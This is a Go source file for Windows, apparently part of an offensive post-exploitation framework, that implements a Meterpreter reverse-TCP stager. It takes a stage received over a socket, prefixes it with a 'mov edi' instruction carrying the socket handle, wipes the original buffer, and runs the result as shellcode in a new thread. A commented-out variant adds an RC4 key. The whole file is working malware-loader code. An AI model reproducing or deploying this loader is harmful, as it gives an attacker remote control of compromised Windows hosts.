// +build windows

package meterpreter

import (
	"encoding/binary"
	"net"
	"runtime"

	"project/internal/module/shellcode"
	"project/internal/system"
)

func reverseTCP(conn *net.TCPConn, stage []byte, _ string) error {
	stageSize := len(stage)
	const mov = 0xBF
	// get connection handle
	handle, err := system.GetConnHandle(conn)
	if err != nil {
		return err
	}
	// make final stage
	// BF 78 56 34 12 => mov edi, 0x12345678
	// BF + socket handle
	var final []byte
	switch runtime.GOARCH {
	case "386":
		final = make([]byte, 1+4+stageSize)
		for i := 0; i < stageSize; i++ {
			final[i+1+4] = stage[i]
			stage[i] = 0 // cover stage at once
		}
		final[0] = mov
		// write handle
		binary.LittleEndian.PutUint32(final[1:1+4], uint32(handle))
	case "amd64":
		final = make([]byte, 1+8+stageSize)
		for i := 0; i < stageSize; i++ {
			final[i+1+8] = stage[i]
			stage[i] = 0 // cover stage at once
		}
		final[0] = mov
		// write handle
		binary.LittleEndian.PutUint64(final[1:1+8], uint64(handle))
	}
	// must force use MethodCreateThread, otherwise it will
	// panic, because meterpreter need rwx memory
	return shellcode.Execute(shellcode.MethodCreateThread, final)
}

// socket handle + address of s-box + stage length + address of stage
// func reverseTCPRC4(conn *net.TCPConn, key, stage []byte, _ string) error {
// 	stageSize := len(stage)
// 	const (
// 		mov = 0xBF
// 		// sBoxSize = 256
// 		keySize = 12
// 	)
// 	// make final stage
// 	// BF 78 56 34 12 => mov edi, 0x12345678
// 	// BF + socket handle + RC4 key
// 	var final []byte
// 	switch runtime.GOARCH {
// 	case "386":
// 		final = make([]byte, 1+4+keySize+stageSize)
// 		for i := 0; i < stageSize; i++ {
// 			final[i+1+4+keySize] = stage[i]
// 			stage[i] = 0 // cover stage at once
// 		}
// 		final[0] = mov
// 		// write handle
// 		binary.LittleEndian.PutUint32(final[1:1+4], uint32(conn.Handle()))
// 		// write RC4 key
// 		copy(final[1+4:], key)
// 	case "amd64":
// 		final = make([]byte, 1+8+keySize+stageSize)
// 		for i := 0; i < stageSize; i++ {
// 			final[i+1+8+keySize] = stage[i]
// 			stage[i] = 0 // cover stage at once
// 		}
// 		final[0] = mov
// 		// write handle
// 		binary.LittleEndian.PutUint64(final[1:1+8], uint64(conn.Handle()))
// 		// write RC4 key
// 		copy(final[1+8:], key)
// 	}
// 	// must force use MethodCreateThread, otherwise it will
// 	// panic, because meterpreter need rwx memory
// 	return shellcode.Execute(shellcode.MethodCreateThread, final)
// }
